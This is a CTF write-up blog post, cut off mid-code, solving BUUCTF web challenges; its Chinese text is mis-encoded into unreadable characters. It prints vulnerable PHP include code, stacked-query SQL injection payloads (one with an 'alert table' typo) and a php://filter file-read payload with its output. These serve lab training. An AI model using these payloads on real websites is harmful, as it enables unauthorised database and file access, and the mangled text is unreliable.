{"blogid": "119641325", "writerAge": "ç é¾„2å¹´", "writerBlogNum": "76", "writerCollect": "349", "writerComment": "19", "writerFan": "103", "writerGrade": "4çº§", "writerIntegral": "1057", "writerName": "åƒ_æ—©é¤", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_119641325.jpg", "writerRankTotal": "17670", "writerRankWeekly": "13298", "writerThumb": "100", "writerVisitNum": "73848", "blog_read_count": "7831", "blog_time": "äºÂ 2021-08-12 12:21:17Â å‘å¸ƒ", "blog_title": "ã€CTFã€‘buuctf web è¯¦è§£ï¼ˆæŒç»­æ›´æ–°ï¼‰", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night-eighties\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>buuctf web</h3>\n<ul><li><a href=\"#HCTF_2018WarmUp_2\">[HCTF 2018]WarmUp</a></li><li><a href=\"#_2019EasySQL_76\">[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</a></li><li><a href=\"#_2019Havefun_80\">[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</a></li><li><a href=\"#_2019_102\">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</a></li><li><a href=\"#ACTF2020_Include_136\">[ACTF2020 æ–°ç”Ÿèµ›]Include</a></li><li><a href=\"#SUCTF_2019EasySQL_193\">[SUCTF 2019]EasySQL</a></li><li><a href=\"#_2019Secret_File_212\">[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</a></li><li><a href=\"#ACTF2020_Exec_292\">[ACTF2020 æ–°ç”Ÿèµ›]Exec</a></li><li><a href=\"#_2019LoveSQL_312\">[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</a></li><li><a href=\"#GXYCTF2019Ping_Ping_Ping_341\">[GXYCTF2019]Ping Ping Ping</a></li><li><a href=\"#_2019Knife_438\">[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</a></li><li><a href=\"#_2019Http_455\">[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</a></li><li><a href=\"#RoarCTF_2019Easy_Calc_474\">[RoarCTF 2019]Easy Calc</a></li><li><a href=\"#_2019Upload_512\">[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</a></li><li><a href=\"#_2019PHP_538\">[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</a></li><li><a href=\"#_2018easy_tornado_665\">[æŠ¤ç½‘æ¯ 2018]easy_tornado</a></li><li><a href=\"#ACTF2020_Upload_711\">[ACTF2020 æ–°ç”Ÿèµ›]Upload</a></li><li><a href=\"#_2019BabySQL_729\">[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</a></li><li><a href=\"#ACTF2020_BackupFile_761\">[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</a></li><li><a href=\"#HCTF_2018admin_807\">[HCTF 2018]admin</a></li><li><a href=\"#_2019BuyFlag_964\">[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</a></li><li><a href=\"#BJDCTF2020Easy_MD5_988\">[BJDCTF2020]Easy MD5</a></li><li><a href=\"#ZJCTF_2019NiZhuanSiWei_1018\">[ZJCTF 2019]NiZhuanSiWei</a></li><li><a href=\"#SUCTF_2019CheckIn_1069\">[SUCTF 2019]CheckIn</a></li><li><a href=\"#_2019HardSQL_1098\">[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</a></li><li><a href=\"#_2020_AreUSerialz_1116\">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</a></li><li><a href=\"#MRCTF2020_1223\">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</a></li><li><a href=\"#MRCTF2020Ez_bypass_1267\">[MRCTF2020]Ez_bypass</a></li><li><a href=\"#GXYCTF2019BabySQli_1335\">[GXYCTF2019]BabySQli</a></li><li><a href=\"#CISCN2019__Day2_Web1Hack_World_1429\">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</a></li><li><a href=\"#GYCTF2020Blacklist_1465\">[GYCTF2020]Blacklist</a></li><li><a href=\"#_2018Fakebook_1483\">[ç½‘é¼æ¯ 2018]Fakebook</a></li><li><a href=\"#GXYCTF2019BabyUpload_1576\">[GXYCTF2019]BabyUpload</a></li><li><a href=\"#BUUCTF_2018Online_Tool_1640\">[BUUCTF 2018]Online Tool</a></li><li><a href=\"#RoarCTF_2019Easy_Java_1709\">[RoarCTF 2019]Easy Java</a></li><li><a href=\"#GXYCTF2019_1717\">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</a></li><li><a href=\"#GWCTF_2019_1725\">[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"HCTF_2018WarmUp_2\"></a>[HCTF 2018]WarmUp</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šPHPä»£ç å®¡è®¡</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210717224401610.png\"/><br/> æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ªsource.phpæ–‡ä»¶<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210717224500633.png\"/><br/> æŸ¥çœ‹æ­¤æ–‡ä»¶ï¼Œå‡ºç°ä¸€å †PHPä»£ç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210717225603522.png\"/><br/> å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªhint.phpæ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210717225757751.png\"/><br/> æ–‡ä»¶é‡Œè¯´æ˜flagåœ¨ffffllllaaaaggggé‡Œ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\2021071723062834.png\"/></p>\n<ul><li><strong>ä»£ç å®¡è®¡</strong><br/> <mark>is_string()</mark>ï¼šæ£€æµ‹å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²<br/> <mark>isset()</mark>ï¼šæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULL<br/> <mark>in_array(è¦æœç´¢çš„å€¼ï¼Œè¦æœç´¢çš„æ•°ç»„)</mark>ï¼šæœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼<br/> <mark>mb_substr($pageï¼Œnï¼Œm)</mark>ï¼šè¿”å›pageä¸­ä»ç¬¬nä½å¼€å§‹ï¼Œåˆ°n+mä½å­—ç¬¦ä¸²çš„å€¼<br/> <mark>mb_strpos()</mark>ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®<br/> <mark>urldecode()</mark>ï¼šå°†urlç¼–ç åçš„å­—ç¬¦ä¸²è¿˜åŸæˆæœªç¼–ç çš„æ ·å­</li></ul>\n<pre><code class=\"prism language-php\"> <span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">emmm</span>\n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//å¦‚æœpageçš„å€¼ä¸ºç©ºæˆ–è€…ä¸æ˜¯å­—ç¬¦ä¸²</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">//æ£€æµ‹pageçš„å€¼æ˜¯å¦åœ¨ç™½åå•ä¸­</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">//è¿”å›pageä¸­ä»ç¬¬0ä½å¼€å§‹åˆ°ç¬¬ä¸€ä¸ªï¼Ÿå‡ºç°çš„ä½ç½®ï¼Œä¹‹é—´çš„å€¼èµ‹ç»™page</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//æ£€éªŒpageçš„å€¼æ˜¯å¦åœ¨ç™½åå•å†…</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token comment\">//å°†urlç¼–ç åçš„å­—ç¬¦ä¸²è¿˜åŸæˆæœªç¼–ç çš„æ ·å­ï¼Œç„¶åèµ‹å€¼ç»™page</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//è¿”å›pageä¸­ä»ç¬¬0ä½å¼€å§‹åˆ°ç¬¬ä¸€ä¸ªï¼Ÿå‡ºç°çš„ä½ç½®ï¼Œä¹‹é—´çš„å€¼èµ‹ç»™page</span>\n            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span>\n                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span>\n                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//æ£€éªŒpageçš„å€¼æ˜¯å¦åœ¨ç™½åå•å†…</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\t\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">emmm</span><span class=\"token operator\">::</span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>  \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> \n</code></pre>\n<h1><a id=\"_2019EasySQL_76\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šç®€å•çš„SQLæ³¨å…¥</strong><br/> ç›´æ¥ä¸‡èƒ½å¯†ç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718102744574.png\"/></p>\n<h1><a id=\"_2019Havefun_80\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šä»£ç å®¡è®¡</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718104856271.png\"/>æŸ¥çœ‹æºä»£ç </p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n                <span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>\n        <span class=\"token variable\">$cat</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cat'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$cat</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cat</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'dog'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Syc{cat_cat_cat_cat}'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token operator\">--</span><span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"position: absolute;bottom: 0;width: 99%;\"</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>p align<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"center\"</span> style<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"font:italic 15px Georgia,serif;color:black;\"</span><span class=\"token operator\">&gt;</span> Syclover @ cl4y<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>p<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><strong>ä»£ç å®¡è®¡</strong><br/> æœ‰ä¸€ä¸ªcatå˜é‡ï¼Œé€šè¿‡getæ–¹å¼ä¼ å‚ï¼Œå¦‚æœcat=dogè¾“å‡ºflag<br/> ä½¿ç”¨æ„é€ payloadï¼š<code>/?cat=dog</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718104746485.png\"/></p>\n<h1><a id=\"_2019_102\"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h1>\n<p>é¢˜ç›®ç±»å‹ï¼šSQLæ³¨å…¥<br/> æœ¬é¢˜è¦æœ‰SQLè¯­æ³•åŸºç¡€ï¼š<a href=\"https://blog.csdn.net/m0_52923241/article/details/115219914?spm=1001.2014.3001.5501\">SQLé€šç”¨è¯­æ³•</a><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718105320474.png\"/><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718111624835.png\"/><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718111814138.png\"/><br/> æŸ¥è¯¢3æ—¶æŠ¥é”™ï¼Œè¯´æ˜æœ‰ä¸¤ä¸ªå­—æ®µ</p>\n<p>ç„¶åæƒ³å°è¯•è”åˆæŸ¥è¯¢<br/> ç»“æœæŠ¥é”™<code>return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);</code><br/> å‘ç°è¿‡æ»¤äº†<code>select|update|delete|drop|insert|where|\\./i</code><br/> çˆ†æ•°æ®åº“ï¼š<code>1';show databases;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718182444510.png\"/><br/> çˆ†è¡¨åï¼š<code>1'; show tables;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\202107181826372.png\"/><br/> å‡ºæ¥ä¸¤ä¸ªè¡¨<br/> <code>1'; show columns from words;#</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718184651257.png\"/></p>\n<p><code>1'; show columns from '1919810931114514';#</code><br/> æ³¨æ„ï¼šè¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210718183124849.png\"/><br/> å‘ç°1919810931114514è¡¨ä¸­æœ‰flag</p>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/103239145\">æ¥ä¸‹æ¥çš„å‚è€ƒå¤§ä½¬ä»¬çš„æ–¹æ³•</a><br/> å¤§ä½¬æ–‡ç« é‡Œæ€»ç»“äº†ä¸‰ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ¯”è¾ƒå¥½ç†è§£ï¼Œå…¶ä»–ä¸¤ç§æ€ªæˆ‘å¤ªèœçœ‹ä¸å¤ªæ˜ç™½</p>\n<blockquote>\n<ul><li>é€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</li><li>æŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</li><li>ç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</li><li>å°† flag æ”¹åä¸º data ã€‚<br/> <code>1'; rename table words to word1; rename table '1919810931114514' to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</code></li></ul>\n</blockquote>\n<h1><a id=\"ACTF2020_Include_136\"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h1>\n<p><strong>é¢˜ç›®ç±»å‹ï¼šæ–‡ä»¶åŒ…å«ã€PHPå°è£…åè®®</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210719184041836.png\"/><br/> ç‚¹å‡»é“¾æ¥</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\20210719184111485.png\"/><br/> å‡ºç°äº†flag.phpæ–‡ä»¶ï¼Œ?file=flag.php çŒœæµ‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ­¤æ—¶å°±è¦æƒ³åŠæ³•æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶,é‚£æ€æ ·æ¥æŸ¥çœ‹å‘¢ï¼Œä¸‹é¢æ˜¯æˆ‘å­¦åˆ°çš„ä¸€ä¸ªæ–¹æ³•</p>\n<blockquote>\n<p><strong>é‡è¦çš„çŸ¥è¯†ç‚¹â€”â€”PHPå°è£…åè®®ï¼š</strong><br/> <code>php://filter/read=convert.base64-encode/resource=xxx.php</code><br/> <strong>php://filter</strong> æ˜¯phpä¸­ç‹¬æœ‰çš„ä¸€ä¸ªåè®®ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå¯ä»¥è¿›è¡Œ<strong>ä»»æ„æ–‡ä»¶çš„è¯»å–</strong>ï¼›æ ¹æ®åå­—filterï¼Œå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸ªåè®®å¯ä»¥ç”¨æ¥è¿‡æ»¤ä¸€äº›ä¸œè¥¿ï¼› ä½¿ç”¨ä¸åŒçš„å‚æ•°å¯ä»¥è¾¾åˆ°ä¸åŒçš„ç›®çš„å’Œæ•ˆæœï¼š<br/> <code>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</code> æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ å¿…é€‰<br/> <code>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚ å¯é€‰<br/> <code>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code> å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚ å¯é€‰<br/> <code>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code> ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ–write=ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚<br/> <strong>php://filter</strong>ä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œé˜»æ­¢å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚<br/> <strong>read=convert.base64-encode</strong>ï¼Œç”¨base64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œï¼Œçœ‹ä¸åˆ°æºä»£ç å†…å®¹ã€‚</p>\n</blockquote>\n<ul><li> <p>php://filteråè®®ï¼Œç”¨base64ç¼–ç çš„æ–¹å¼æ¥è¯»æ–‡ä»¶flag.phpï¼›è¿™æ—¶é¡µé¢ä¼šæ˜¾ç¤ºå‡ºæºæ–‡ä»¶flag.phpç»è¿‡base64ç¼–ç åçš„å†…å®¹ï¼Œç„¶åç»è¿‡base64è§£ç å°±å¯ä»¥çœ‹åˆ°flagï¼›</p> </li><li> <p>payload: <code>/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p> </li><li> <p>å¾—åˆ°base64ç¼–ç åçš„å†…å®¹ä¸ºï¼š<br/> PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7Y2U4MzdmMmYtYjI2Mi00ZDYxLWEzOWQtOTE4OWIwYmM0ODZkfQo=</p> </li><li> <p>æ¥ç€base64è§£ç ï¼š</p> <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Can you find out the flag?\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//flag{ce837f2f-b262-4d61-a39d-9189b0bc486d}</span>\n\n</code></pre> </li><li> <p>å¾—åˆ°flag~~</p> </li></ul>\n<p>æˆ‘ä»¬å†ä»¥è¿™ç§æ–¹æ³•æŸ¥çœ‹ä¸€ä¸‹index.phpæ–‡ä»¶</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">&lt;</span>meta charset<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf8\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token comment\">// å…³é—­é”™è¯¯æŠ¥å‘Š</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//ä»¥getæ–¹å¼ä¼ å‚</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//stristr() 